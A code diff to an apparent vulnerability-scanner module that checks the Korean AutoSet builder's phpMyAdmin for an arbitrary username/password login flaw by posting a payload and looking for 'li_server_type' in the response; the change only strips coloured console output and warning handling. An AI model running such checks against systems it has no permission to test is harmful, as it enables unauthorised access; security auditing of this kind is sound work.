@@ -9,8 +9,7 @@ description: /phpmyadmin任意用户名密码登录,通过低权限提权可获�
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
 
 class autoset_phpmyadmin_unauth_BaseVerify:
     def __init__(self, url):
@@ -31,17 +30,13 @@ class autoset_phpmyadmin_unauth_BaseVerify:
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"li_server_type" in req.text:
-                cprint("[+]存在韩国autoset建站程序phpmyadmin任意登录漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
                 return True,vulnurl,"韩国autoset建站程序phpmyadmin任意登录漏洞",payload,req.text
             else:
-                cprint("[-]不存在autoset_phpmyadmin_unauth漏洞", "white", "on_grey")
                 return False, None, None, None, None
 
         except:
-            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
             return False, None, None, None, None
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = autoset_phpmyadmin_unauth_BaseVerify(sys.argv[1])
     testVuln.run()
